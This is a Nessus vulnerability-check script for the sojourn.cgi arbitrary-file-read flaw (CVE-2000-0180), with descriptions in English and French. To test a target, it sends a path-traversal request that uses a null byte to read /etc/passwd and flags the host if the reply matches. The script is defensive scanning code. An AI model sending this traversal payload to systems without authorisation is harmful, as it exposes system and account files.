#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#

if(description)
{
 script_id(10349);
 script_bugtraq_id(1052);
 script_version ("$Revision: 1.22 $");
 script_cve_id("CVE-2000-0180");
 
 name["english"] = "sojourn.cgi";
 name["francais"] = "sojourn.cgi";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "The 'sojourn.cgi' CGI is installed. This CGI has
a well known security flaw that lets an attacker read arbitrary
files with the privileges of the http daemon (usually root or nobody).

Solution : remove it from /cgi-bin.

Risk factor : High";


 desc["francais"] = "Le cgi 'sojourn.cgi' est installé. Celui-ci possède
un problème de sécurité bien connu qui permet à n'importe qui de faire
lire des fichiers arbitraires au daemon http, avec les privilèges
de celui-ci (root ou nobody). 

Solution : retirez-le de /cgi-bin.

Facteur de risque : Sérieux";


 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Checks for the presence of /cgi-bin/sojourn.cgi";
 summary["francais"] = "Vérifie la présence de /cgi-bin/sojourn.cgi";
 
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_GATHER_INFO);
 
 
 script_copyright(english:"This script is Copyright (C) 2000 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2000 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}

#
# The script code starts here
#

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);


if(!get_port_state(port))exit(0);

foreach dir (cgi_dirs())
{
 rq = string(dir, "/sojourn.cgi?cat=../../../../../etc/passwd%00");
 rq = http_get(item:rq, port:port);
 r = http_keepalive_send_recv(port:port, data:rq);
 if(egrep(pattern:".*root:.*:0:[01]:.*", string:r))
 {
  security_hole(port);
 }
}
